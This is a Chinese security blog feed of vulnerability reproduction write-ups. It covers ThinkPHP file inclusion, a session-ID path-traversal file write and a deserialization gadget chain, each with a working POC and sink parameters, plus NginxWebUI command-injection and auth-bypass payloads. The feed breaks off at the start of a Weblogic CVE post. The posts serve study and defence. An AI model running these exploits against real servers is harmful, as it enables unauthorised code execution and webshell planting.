alt="image-20230708191822492"></p><p>这个函数首先是从http请求中的三个地方获取数据，然后转成小写字母保存到$langSet中</p><p>然后如果满足if条件，就将<code>$langSet</code>保存到range中返回</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230708192423332.png" alt="image-20230708192423332"></p><p>全局查找detect()的引用，找到了Lang.php的handle函数，正是加载语言包的地方</p><p>查看handle()</p><pre><code class="php">public function handle($request, Closure $next)    &#123;        // 自动侦测当前语言        $langset = $this-&gt;lang-&gt;detect($request);        if ($this-&gt;lang-&gt;defaultLangSet() != $langset) &#123;            // 加载系统语言包            $this-&gt;lang-&gt;load([                $this-&gt;app-&gt;getThinkPath() . &#39;lang&#39; . DIRECTORY_SEPARATOR . $langset . &#39;.php&#39;,            ]);            $this-&gt;app-&gt;LoadLangPack($langset);        &#125;        $this-&gt;lang-&gt;saveToCookie($this-&gt;app-&gt;cookie);        return $next($request);    &#125;</code></pre><p>在函数第一条代码中，就调用了，detect()方法</p><p>环境搭建</p><p>搭建环境，传参调试一下：</p><p>开启开启多语言功能：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230708194806182.png" alt="image-20230708194806182"></p><pre><code>http://127.0.0.1/?lang=../../../../../public/test</code></pre><p>在handle函数下断点</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230708192934742.png" alt="image-20230708192934742"></p><p>跟进detect()</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230708193017298.png" alt="image-20230708193017298"></p><p>这里从get方法中获取值，保存到了langSet</p><p>往下，因为默认情况下allow_lang_list是空的，进入if语句</p><p><img src="C:\Users\Tree\AppData\Roaming\Typora\typora-user-images\image-20230708193130198.png" alt="image-20230708193130198"></p><p><img src="C:\Users\Tree\AppData\Roaming\Typora\typora-user-images\image-20230708193216162.png" alt="image-20230708193216162"></p><p>返会handle()</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230708193317784.png" alt="image-20230708193317784"></p><p>然后加载语言包</p><p>这里出现一个目录拼接，<code>$this-&gt;app-&gt;getThinkPath()</code>是获取TP核心框架目录，</p><p>拼接结果：</p><pre><code class="php">...\topthink\framework\src\lang\../../../../../public/test.php</code></pre><p>最终会加载public目录下的test.php</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230708194435061.png" alt="image-20230708194435061"></p><p>结果：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230708194532880.png" alt="image-20230708194532880"></p><h3 id="任意文件写（6-0-0，6-0-1）"><a href="#任意文件写（6-0-0，6-0-1）" class="headerlink" title="任意文件写（6.0.0，6.0.1）"></a>任意文件写（6.0.0，6.0.1）</h3><p>环境：tp6.0.1</p><p>控制器：</p><pre><code class="php">&lt;?phpnamespace app\controller;use app\BaseController;class Index extends BaseController&#123;    public function index()    &#123;        session(&#39;demo&#39;, $_GET[&#39;demo&#39;]);        return &#39;ThinkPHP V6.0.1&#39;;    &#125;    public function hello($name = &#39;ThinkPHP6&#39;)    &#123;        return &#39;hello,&#39; . $name;    &#125;&#125;</code></pre><p>修改 &#x2F;app&#x2F;middleware.php 文件如下,开启Session功能</p><pre><code class="php">&lt;?php// 全局中间件定义文件return [    // 全局请求缓存    // \think\middleware\CheckRequestCache::class,    // 多语言加载    // \think\middleware\LoadLangPack::class,    // Session初始化     \think\middleware\SessionInit::class];</code></pre><p>对比6.0.1和6.0.2，官方修改了<code>sessionid</code>的检查,添加了ctype_alnum 函数验证$id只能是字母和数字或字母数字的组合</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707093621722.png" alt="image-20230707093621722"></p><p>漏洞具体流程如下：</p><pre><code>?demo=AAAAA</code></pre><p>当程序初始化的时候，会对seess进行初始化</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707105459607.png" alt="image-20230707105459607"></p><p>然后会调用<code>getName()</code>获取cookie中<code>PHPSESSID</code>的值，里面调用了setId（）</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707105829879.png" alt="image-20230707105829879"></p><p>如果不存在PHPSESSID,或者不满足条件，则重新生成一个32位的<code>PHPSESSID</code> , 如果满足条件则不管</p><p>调用栈如下：</p><pre><code class="php">Store.php:121, think\session\Store-&gt;setId()Store.php:61, think\session\Store-&gt;__construct()Session.php:31, think\Session-&gt;createDriver()Manager.php:65, think\Manager-&gt;getDriver()Manager.php:55, think\Manager-&gt;driver()Manager.php:174, think\Manager-&gt;__call()SessionInit.php:50, think\Manager-&gt;getName()SessionInit.php:50, think\middleware\SessionInit-&gt;handle()Middleware.php:142, call_user_func:&#123;D:\phpstudy_pro\WWW\thinkphp-6.0.1\vendor\topthink\framework\src\think\Middleware.php:142&#125;()Middleware.php:142, think\Middleware-&gt;think\&#123;closure:D:\phpstudy_pro\WWW\thinkphp-6.0.1\vendor\topthink\framework\src\think\Middleware.php:137-148&#125;()Pipeline.php:84, think\Pipeline-&gt;think\&#123;closure:D:\phpstudy_pro\WWW\thinkphp-6.0.1\vendor\topthink\framework\src\think\Pipeline.php:82-88&#125;()Pipeline.php:65, think\Pipeline-&gt;then()Http.php:204, think\Http-&gt;runWithRequest()Http.php:162, think\Http-&gt;run()index.php:20, &#123;main&#125;()</code></pre><p>返回<code>handle()</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707110224668.png" alt="image-20230707110224668"></p><p>发现后面会再次取出PHPSESSID的值传给<code>setId</code>进行检查</p><p>后面的过程就是发送给客户端</p><p>当程序结束的时候，会执行中间件</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707110744130.png" alt="image-20230707110744130"></p><p>里面会调用Sessioninit.php的end方法</p><pre><code class="php">public function end(Response $response)    &#123;        $this-&gt;session-&gt;save();    &#125;</code></pre><p>往下会执行,调用栈如下：</p><pre><code>Store.php:263, think\session\Store-&gt;save()Manager.php:174, think\Manager-&gt;__call()SessionInit.php:78, think\Manager-&gt;save()SessionInit.php:78, think\middleware\SessionInit-&gt;end()Middleware.php:165, think\Middleware-&gt;end()Http.php:279, think\Http-&gt;end()index.php:24, &#123;main&#125;()</code></pre><p>在这里存在一个日志写入的操作</p><pre><code class="php">public function save(): void    &#123;        $this-&gt;clearFlashData();        $sessionId = $this-&gt;getId();        if (!empty($this-&gt;data)) &#123;            $data = $this-&gt;serialize($this-&gt;data);            $this-&gt;handler-&gt;write($sessionId, $data);        &#125; else &#123;            $this-&gt;handler-&gt;delete($sessionId);        &#125;        $this-&gt;init = false;    &#125;</code></pre><p>跟进<code>write()</code></p><pre><code class="php">public function write(string $sessID, string $sessData): bool    &#123;        $filename = $this-&gt;getFileName($sessID, true);        $data     = $sessData;        if ($this-&gt;config[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) &#123;            //数据压缩            $data = gzcompress($data, 3);        &#125;        return $this-&gt;writeFile($filename, $data);    &#125;</code></pre><p>跟进<code>getFileName</code>  查看文件名生成规则，</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707111534094.png" alt="image-20230707111534094"></p><p>简而言之，就是</p><pre><code>日志路径/文件名文件名 = sess_  + PHPSSID的值</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707111754581.png" alt="image-20230707111754581"></p><p>返回后，获取<code>$data</code>, 这个$data是序列化后的session值</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707111921264.png" alt="image-20230707111921264"></p><p>然后将这两个值传给<code>writeFile</code>方法</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707112027859.png" alt="image-20230707112027859"></p><p>跟进</p><pre><code class="php">protected function writeFile($path, $content): bool &#123;    return (bool) file_put_contents($path, $content, LOCK_EX);&#125;</code></pre><p>这里是调用了<code>file_put_contents</code> 进行文件写入</p><p>$path, $content都是可以控制的，  $content就是序列化后session的内容，$path就是sess_  + PHPSSID的值</p><p>$path这里可以通过目录穿越写入任意文件，但是需要满足<code>setId</code>的检查，长度必须要32位</p><pre><code class="php">public function setId($id = null): void    &#123;        $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());    &#125;</code></pre><p>所以构造POC如下：</p><pre><code>http://127.0.0.1/?demo=&lt;?php phpinfo();?&gt;Cookie: PHPSESSID=/../../../public/11111111111.php</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707113517298.png" alt="image-20230707113517298"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707113531457.png" alt="image-20230707113531457"><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707113610880.png" alt="image-20230707113610880"></p><h3 id="反序列-6-0-15"><a href="#反序列-6-0-15" class="headerlink" title="反序列 (6.0.15)"></a>反序列 (6.0.15)</h3><pre><code class="php">&lt;?phpnamespace app\controller;use app\BaseController;class Index extends BaseController&#123;    public function index()    &#123;        $u = unserialize($_GET[&#39;c&#39;]);        return &#39;ThinkPHP V6.x&#39;;    &#125;&#125;</code></pre><p>全局搜索__destruct(),发现TP6移除了TP5反序列化中的<code>think/process/pipes/Windows.php</code>入口</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707141236993.png" alt="image-20230707141236993"></p><p>尝试寻找其他入口，查看<code>vendor/topthink/think-orm/src/Model.php</code>这个</p><pre><code class="php">public function __destruct()    &#123;        if ($this-&gt;lazySave) &#123;            $this-&gt;save();        &#125;    &#125;</code></pre><p>这个$this-&gt;lazySave可控，可以进入$this-&gt;save()</p><p>跟进<code>save()</code></p><pre><code class="php">public function save(array $data = [], string $sequence = null): bool    &#123;        // 数据对象赋值        $this-&gt;setAttrs($data);        if ($this-&gt;isEmpty() || false === $this-&gt;trigger(&#39;BeforeWrite&#39;)) &#123;            return false;        &#125;        $result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence);        if (false === $result) &#123;            return false;        &#125;        // 写入回调        $this-&gt;trigger(&#39;AfterWrite&#39;);        // 重新记录原始数据        $this-&gt;origin   = $this-&gt;data;        $this-&gt;get      = [];        $this-&gt;lazySave = false;        return true;    &#125;</code></pre><p>这可以控制$this-&gt;exists使得函数调用<code>$this-&gt;updateData()</code></p><p>跟进<code>$this-&gt;updateData()</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707144819630.png" alt="image-20230707144819630"></p><p>跟进<code>checkAllowFields()</code> </p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707165249733.png" alt="image-20230707165249733"></p><p>跟进db()</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707165321713.png" alt="image-20230707165321713"></p><p>这里存在一个字符串拼接可以触发任意类的<code>__toString</code></p><p>这里后面就可以使用<code>TP5.1.x</code>后半段的链子了</p><p>全局搜索<code>__toString</code> 找到<code>vendor/topthink/think-orm/src/model/concern/Conversion.php</code></p><pre><code class="php">public function __toString()    &#123;        return $this-&gt;toJson();    &#125;</code></pre><p>跟进<code>toJson()</code></p><pre><code class="php">public function toJson(int $options = JSON_UNESCAPED_UNICODE): string    &#123;        return json_encode($this-&gt;toArray(), $options);    &#125;</code></pre><p>跟进<code>toArray()</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707165504741.png" alt="image-20230707165504741"></p><p>这个方法里面调用 了<code>getAtter</code></p><p>跟进：</p><pre><code class="php">public function getAttr(string $name)    &#123;        try &#123;            $relation = false;            $value    = $this-&gt;getData($name);        &#125; catch (InvalidArgumentException $e) &#123;            $relation = $this-&gt;isRelationAttr($name);            $value    = null;        &#125;        return $this-&gt;getValue($name, $value, $relation);    &#125;</code></pre><p>最后调用了<code>getValue</code></p><p>跟进</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707165728185.png" alt="image-20230707165728185"></p><p>这个$closure是可控的，可以用来调用任意函数比如system()，其参数$value,是由上一层传来的参数控制，也可控</p><p>链子到这里结束</p><p>POC：</p><pre><code class="php">&lt;?phpnamespace think;abstract class Model&#123;    private $lazySave;    protected $suffix;    private $data;    private $withAttr;    function __construct($obj = &#39;&#39;)    &#123;        $this-&gt;lazySave = true;        $this-&gt;suffix =$obj;        $this-&gt;withAttr=[&#39;b&#39;=&gt;&#39;system&#39;];        $this-&gt;data=[&#39;b&#39;=&gt;&#39;calc&#39;];    &#125;&#125;namespace think\model;use think\Model;class Pivot extends Model&#123;&#125;$a = new Pivot();$b = new Pivot($a);echo urlencode(serialize($b));</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707170252876.png" alt="image-20230707170252876"></p><p>写在后面：</p><p>上面最后执行的方法在：</p><pre><code>vendor/topthink/think-orm/src/model/concern/Attribute.php</code></pre><p>在TP6后这里已经修复了：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707171052318.png" alt="image-20230707171052318"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>反序列化<code>__destruct</code>入口就那4-5个，常用的是这两个<code>think/process/pipes/Windows.php</code> 和<code>thinkphp/library/think/Process.php</code></p><p>上面提到的几条利用链，可以小记一下，但是<code>vendor/topthink/think-orm/src/model/concern/Attribute.php</code> 的<code>getValue</code>方法在TP6里面不能用了，需要寻找其他利用方法</p><p>Request.php中很多方法调用了<code>filterValue</code>,而该方法中就存在可利用的 <code>call_user_func</code>函数,反序列化结尾的利用可以考虑这里</p><p>php能代码执行的函数</p><pre><code class="php">//App.php//传参 ：call_user_func_array&amp;vars[0]=system&amp;vars[1][]=calcpublic static function invokeFunction($function, $vars = [])    &#123;        $reflect = new \ReflectionFunction($function);        $args    = self::bindParams($reflect, $vars);        // 记录执行信息        self::$debug &amp;&amp; Log::record(&#39;[ RUN ] &#39; . $reflect-&gt;__toString(), &#39;info&#39;);        return $reflect-&gt;invokeArgs($args);    &#125;</code></pre><pre><code class="php">//think/Request.php//传参： filter[]=system&amp;data=calcpublic function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    &#123;        if (false === $name) &#123;            // 获取原始数据            return $data;        &#125;        $name = (string) $name;        if (&#39;&#39; != $name) &#123;            // 解析name            if (strpos($name, &#39;/&#39;)) &#123;                list($name, $type) = explode(&#39;/&#39;, $name);            &#125;            $data = $this-&gt;getData($data, $name);            if (is_null($data)) &#123;                return $default;            &#125;            if (is_object($data)) &#123;                return $data;            &#125;        &#125;        // 解析过滤器        $filter = $this-&gt;getFilter($filter, $default);        if (is_array($data)) &#123;            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);            if (version_compare(PHP_VERSION, &#39;7.1.0&#39;, &#39;&lt;&#39;)) &#123;                // 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针                $this-&gt;arrayReset($data);            &#125;        &#125; else &#123;            $this-&gt;filterValue($data, $name, $filter);        &#125;        if (isset($type) &amp;&amp; $data !== $default) &#123;            // 强制类型转换            $this-&gt;typeCast($data, $type);        &#125;        return $data;    &#125;</code></pre><pre><code class="php">//think/view/driver/Php.php//传参： content=&lt;?php phpinfo();?&gt;public function display($content, $data = [])    &#123;        $this-&gt;content = $content;        extract($data, EXTR_OVERWRITE);        eval(&#39;?&gt;&#39; . $this-&gt;content);    &#125;</code></pre><p>写shell:</p><pre><code class="php">//think/template/driver/File.php//传参： cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt;public function write($cacheFile, $content)    &#123;        // 检测模板目录        $dir = dirname($cacheFile);        if (!is_dir($dir)) &#123;            mkdir($dir, 0755, true);        &#125;        // 生成模板缓存文件        if (false === file_put_contents($cacheFile, $content)) &#123;            throw new Exception(&#39;cache write error:&#39; . $cacheFile, 11602);        &#125;    &#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NginxWebUi 任意命令执行漏洞</title>
      <link href="/2023/07/01/NginxWebUi-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/07/01/NginxWebUi-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>nginxWebUI是一款图形化管理nginx配置的工具，能通过网页快速配置nginx的各种功能，包括HTTP和TCP协议转发、反向代理、负载均衡、静态HTML服务器以及SSL证书的自动申请、续签和配置，配置完成后可以一键生成nginx.conf文件，并控制nginx使用此文件进行启动和重载。<br> nginxWebUI后台提供执行nginx相关命令的接口，由于未对用户的输入进行过滤，导致可在后台执行任意命令。并且该系统权限校验存在问题，导致存在权限绕过，在前台可直接调用后台接口，最终可以达到无条件远程命令执行的效果。</p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>nginxWebUI &lt;&#x3D; 3.5.2  未授权命令执行漏洞（网上公开为3.5.0 但下载后发现作者已删除GITEE中3.5.0的相应代码，下载3.5.0版本jar包反编译后发现并没有对权限绕过进行修复）<br>nginxWebUI 全版本均存在命令执行漏洞(文章截止最新版3.6.0)</p><h1 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h1><h2 id="任意命令执行"><a href="#任意命令执行" class="headerlink" title="任意命令执行"></a>任意命令执行</h2><h4 id="3-4-7-之前版本"><a href="#3-4-7-之前版本" class="headerlink" title="3.4.7 之前版本"></a>3.4.7 之前版本</h4><p>漏洞存在点：<code>com/cym/controller/adminPage/ConfController.java(3.4.7版本之前)</code></p><pre><code class="java">@Controller@Mapping(&quot;/adminPage/conf&quot;)public class ConfController extends BaseController &#123;    ...    @Mapping(value = &quot;runCmd&quot;)    public JsonResult runCmd(String cmd, String type) &#123;        if (StrUtil.isNotEmpty(type)) &#123;            settingService.set(type, cmd);        &#125;        try &#123;            String rs = &quot;&quot;;            if (SystemTool.isWindows()) &#123;                RuntimeUtil.exec(&quot;cmd /c start &quot; + cmd);            &#125; else &#123;                rs = RuntimeUtil.execForStr(&quot;/bin/sh&quot;, &quot;-c&quot;, cmd);            &#125;            cmd = &quot;&lt;span class=&#39;blue&#39;&gt;&quot; + cmd + &quot;&lt;/span&gt;&quot;;            if (StrUtil.isEmpty(rs) || rs.contains(&quot;已终止进程&quot;) //                    || rs.contains(&quot;signal process started&quot;) //                    || rs.toLowerCase().contains(&quot;terminated process&quot;) //                    || rs.toLowerCase().contains(&quot;starting&quot;) //                    || rs.toLowerCase().contains(&quot;stopping&quot;)) &#123;                return renderSuccess(cmd + &quot;&lt;br&gt;&quot; + m.get(&quot;confStr.runSuccess&quot;) + &quot;&lt;br&gt;&quot; + rs.replace(&quot;\n&quot;, &quot;&lt;br&gt;&quot;));            &#125; else &#123;                return renderSuccess(cmd + &quot;&lt;br&gt;&quot; + m.get(&quot;confStr.runFail&quot;) + &quot;&lt;br&gt;&quot; + rs.replace(&quot;\n&quot;, &quot;&lt;br&gt;&quot;));            &#125;        &#125; catch (Exception e) &#123;            logger.error(e.getMessage(), e);            return renderSuccess(m.get(&quot;confStr.runFail&quot;) + &quot;&lt;br&gt;&quot; + e.getMessage().replace(&quot;\n&quot;, &quot;&lt;br&gt;&quot;));        &#125;    &#125;</code></pre><p><code>ConfController#runCmd()</code>方法中对传入 cmd 参数直接拼接到命令后执行命令</p><h5 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h5><pre><code class="java">http://localhost:8080/AdminPage/conf/runCmd?cmd=calc</code></pre><h4 id="3-4-7-及之后版本"><a href="#3-4-7-及之后版本" class="headerlink" title="3.4.7  及之后版本"></a>3.4.7  及之后版本</h4><p>漏洞存在点：<code>com/cym/controller/adminPage/ConfController.java(3.4.7版本之后)</code></p><pre><code class="java">@Controller@Mapping(&quot;/adminPage/conf&quot;)public class ConfController extends BaseController &#123;    ...    @Mapping(value = &quot;runCmd&quot;)    ///adminPage/conf/runCmd?cmd=恶意命令    public JsonResult runCmd(String cmd, String type) &#123;        if (StrUtil.isNotEmpty(type)) &#123;            settingService.set(type, cmd);        &#125;        try &#123;            String rs = &quot;&quot;;            // 过滤特殊字符，防止命令拼接            cmd = cmd.replaceAll(&quot;;&quot;,&quot;\\\\;&quot;);             cmd = cmd.replaceAll(&quot;`&quot;,&quot;\\\\`&quot;);             cmd = cmd.replaceAll(&quot;\\|&quot;,&quot;\\\\|&quot;);             cmd = cmd.replaceAll(&quot;\\&#123;&quot;,&quot;\\\\&#123;&quot;);             cmd = cmd.replaceAll(&quot;\\&#125;&quot;,&quot;\\\\&#125;&quot;);            //仅执行nginx相关的命令，而不是其他的恶意命令            if(!cmd.contains(&quot;nginx&quot;))&#123;                cmd = &quot;nginx restart&quot;;            &#125;            if (SystemTool.isWindows()) &#123;                RuntimeUtil.exec(&quot;cmd /c start &quot; + cmd);            &#125; else &#123;                rs = RuntimeUtil.execForStr(&quot;/bin/sh&quot;, &quot;-c&quot;, cmd);            &#125;            cmd = &quot;&lt;span class=&#39;blue&#39;&gt;&quot; + cmd + &quot;&lt;/span&gt;&quot;;            if (StrUtil.isEmpty(rs) || rs.contains(&quot;已终止进程&quot;) //                    || rs.contains(&quot;signal process started&quot;) //                    || rs.toLowerCase().contains(&quot;terminated process&quot;) //                    || rs.toLowerCase().contains(&quot;starting&quot;) //                    || rs.toLowerCase().contains(&quot;stopping&quot;)) &#123;                return renderSuccess(cmd + &quot;&lt;br&gt;&quot; + m.get(&quot;confStr.runSuccess&quot;) + &quot;&lt;br&gt;&quot; + rs.replace(&quot;\n&quot;, &quot;&lt;br&gt;&quot;));            &#125; else &#123;                return renderSuccess(cmd + &quot;&lt;br&gt;&quot; + m.get(&quot;confStr.runFail&quot;) + &quot;&lt;br&gt;&quot; + rs.replace(&quot;\n&quot;, &quot;&lt;br&gt;&quot;));            &#125;        &#125; catch (Exception e) &#123;            logger.error(e.getMessage(), e);            return renderSuccess(m.get(&quot;confStr.runFail&quot;) + &quot;&lt;br&gt;&quot; + e.getMessage().replace(&quot;\n&quot;, &quot;&lt;br&gt;&quot;));        &#125;    &#125;    ...&#125;</code></pre><p><code>ConfController#runCmd()</code>方法中对传入 cmd 进行过滤后拼接到命令后执行命令，绕过过滤需满足以下要求：</p><ol><li>cmd 参数中存在 nginx</li><li><code>&quot;;&quot;  &quot;</code>“  “\|”  “\{“  “\}”&#96;被过滤，可使用 &amp; 绕过</li></ol><h5 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h5><pre><code class="java">http://localhost:8080/AdminPage/conf/runCmd?cmd=calc%26%26nginx</code></pre><h2 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h2><h4 id="3-5-2-之前版本"><a href="#3-5-2-之前版本" class="headerlink" title="3.5.2 之前版本"></a>3.5.2 之前版本</h4><p> NginxWebUi 使用Solon开发框架，NginxWebUi 权限校验为<code>com/cym/config/AppFilter.java</code></p><pre><code class="java">@Componentpublic class AppFilter implements Filter &#123;    ...    @Override    public void doFilter(Context ctx, FilterChain chain) throws Throwable &#123;        // 全局过滤器        if (!ctx.path().contains(&quot;/lib/&quot;) //                &amp;&amp; !ctx.path().contains(&quot;/js/&quot;) //                &amp;&amp; !ctx.path().contains(&quot;/doc/&quot;) //                &amp;&amp; !ctx.path().contains(&quot;/img/&quot;) //                &amp;&amp; !ctx.path().contains(&quot;/css/&quot;)) &#123;            frontInterceptor(ctx);        &#125;        // 登录过滤器        if (ctx.path().contains(&quot;/adminPage/&quot;) //                &amp;&amp; !ctx.path().contains(&quot;/lib/&quot;) //                &amp;&amp; !ctx.path().contains(&quot;/doc/&quot;) //                &amp;&amp; !ctx.path().contains(&quot;/js/&quot;) //                &amp;&amp; !ctx.path().contains(&quot;/img/&quot;) //                &amp;&amp; !ctx.path().contains(&quot;/css/&quot;)) &#123;            if (!adminInterceptor(ctx)) &#123;                // 设置为已处理                ctx.setHandled(true);                return;            &#125;        &#125;        // api过滤器        if (ctx.path().contains(&quot;/api/&quot;) //                &amp;&amp; !ctx.path().contains(&quot;/lib/&quot;) //                &amp;&amp; !ctx.path().contains(&quot;/doc/&quot;) //                &amp;&amp; !ctx.path().contains(&quot;/js/&quot;) //                &amp;&amp; !ctx.path().contains(&quot;/img/&quot;) //                &amp;&amp; !ctx.path().contains(&quot;/css/&quot;)) &#123;            if (!apiInterceptor(ctx)) &#123;                // 设置为已处理                ctx.setHandled(true);                return;            &#125;        &#125;        chain.doFilter(ctx);    &#125;    ...&#125;</code></pre><p>根据以上源码可知若访问path 中包含 <code>/lib/  /adminPage/  /api/</code>且不包含<code>/lib/   /doc/  /js/   /img/  /css/</code>则进行权限校验，又因<a href="https://solon.noear.org/article/504">Solon 对大小写不敏感</a>，故可使用大小写绕过权限校验</p><h4 id="3-5-2-之后版本"><a href="#3-5-2-之后版本" class="headerlink" title="3.5.2 之后版本"></a>3.5.2 之后版本</h4><pre><code class="java">@Componentpublic class AppFilter implements Filter &#123;    Logger logger = LoggerFactory.getLogger(this.getClass());    @Inject    AdminService adminService;    @Inject    MessageUtils m;    @Inject    CreditService creditService;    @Inject(&quot;$&#123;solon.app.name&#125;&quot;)    String projectName;    @Inject    VersionConfig versionConfig;    @Inject    PropertiesUtils propertiesUtils;    @Inject    SettingService settingService;    @Override    public void doFilter(Context ctx, FilterChain chain) throws Throwable &#123;                String path = ctx.path().toLowerCase();                // 全局过滤器        if (!path.contains(&quot;/lib/&quot;) //                &amp;&amp; !path.toLowerCase().contains(&quot;/js/&quot;) //                &amp;&amp; !path.toLowerCase().contains(&quot;/doc/&quot;) //                &amp;&amp; !path.toLowerCase().contains(&quot;/img/&quot;) //                &amp;&amp; !path.toLowerCase().contains(&quot;/css/&quot;)) &#123;            frontInterceptor(ctx);        &#125;        // 登录过滤器        if (path.toLowerCase().contains(&quot;/adminPage/&quot;.toLowerCase()) //                &amp;&amp; !path.contains(&quot;/lib/&quot;) //                &amp;&amp; !path.contains(&quot;/doc/&quot;) //                &amp;&amp; !path.contains(&quot;/js/&quot;) //                &amp;&amp; !path.contains(&quot;/img/&quot;) //                &amp;&amp; !path.contains(&quot;/css/&quot;)) &#123;            if (!adminInterceptor(ctx)) &#123;                // 设置为已处理                ctx.setHandled(true);                return;            &#125;        &#125;        // api过滤器        if (path.toLowerCase().contains(&quot;/api/&quot;) //                &amp;&amp; !path.contains(&quot;/lib/&quot;) //                &amp;&amp; !path.contains(&quot;/doc/&quot;) //                &amp;&amp; !path.contains(&quot;/js/&quot;) //                &amp;&amp; !path.contains(&quot;/img/&quot;) //                &amp;&amp; !path.contains(&quot;/css/&quot;)) &#123;            if (!apiInterceptor(ctx)) &#123;                // 设置为已处理                ctx.setHandled(true);                return;            &#125;        &#125;        chain.doFilter(ctx);    &#125;&#125;</code></pre><p>3.5.0之后先对 path 进行处理再进行判断，权限绕过失败</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于Weblogic漏洞(CVE-2023-21839和CVE-2023-21931)</title>
      <link href="/2023/06/28/%E5%85%B3%E4%BA%8EWeblogic%E6%BC%8F%E6%B4%9E-CVE-2023-21839%E5%92%8CCVE-2023-21931/"/>
      <url>/2023/06/28/%E5%85%B3%E4%BA%8EWeblogic%E6%BC%8F%E6%B4%9E-CVE-2023-21839%E5%92%8CCVE-2023-21931/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前没复现过Weblogic相关的漏洞，现在有空就想复现一下今年爆出的两个漏洞CVE-2023-21839和CVE-2023-21931，跟着大佬的文章学习一手</p><h2 id="T3协议"><a href="#T3协议" class="headerlink" title="T3协议"></a>T3协议</h2><p>T3协议参考<a href="https://c0ny1.gitbooks.io/javasec/content/jing-dian-an-li/t3xie-yi-yan-jiu.html">https://c0ny1.gitbooks.io/javasec/content/jing-dian-an-li/t3xie-yi-yan-jiu.html</a></p><p>查阅资料发现weblogic的反序列化漏洞大致分为两种，一种是基于T3协议的反序列化漏洞，一种是基于XML的反序列化漏洞。</p><p>关于这个T3协议，是Weblogic里面独有的一个协议，传输的数据是序列化后的数据，而服务器在接收到数据后会进行一个反序列化的操作，所以下面提到的两个漏洞都是属于<strong>后序列化漏洞</strong></p><h2 id="后序列化漏洞"><a href="#后序列化漏洞" class="headerlink" title="后序列化漏洞"></a>后序列化漏洞</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230628161949561.png" alt="image-20230628161949561"></p><p>Weblogic反序列化漏洞挖掘思路是利⽤ readObject() 、 readResolve() 、 readExternal() 等反序列化⽅法对恶意序列化数据进⾏操作，以达到攻击⽬的。常规的漏洞思路重点关注Weblogic在反序列化过程中进⾏恶意攻击，⽽忽略了反序列化完成后的操作。后反序列化漏洞挖掘的思路重点关注Weblogic完成反序列化过程后，在达到某个时机或执⾏操作后触发的漏洞攻击。</p><h2 id="CVE-2023-21839"><a href="#CVE-2023-21839" class="headerlink" title="CVE-2023-21839"></a>CVE-2023-21839</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>WebLogic存在远程代码执行漏洞，该漏洞允许未经身份验证的远程攻击者通过T3&#x2F;IIOP协议网络访问并破坏易受攻击的WebLogic服务器，成功利用此漏洞可能导致Oracle WebLogic服务器被接管或敏感信息泄露。漏洞原理其实是通过Weblogic 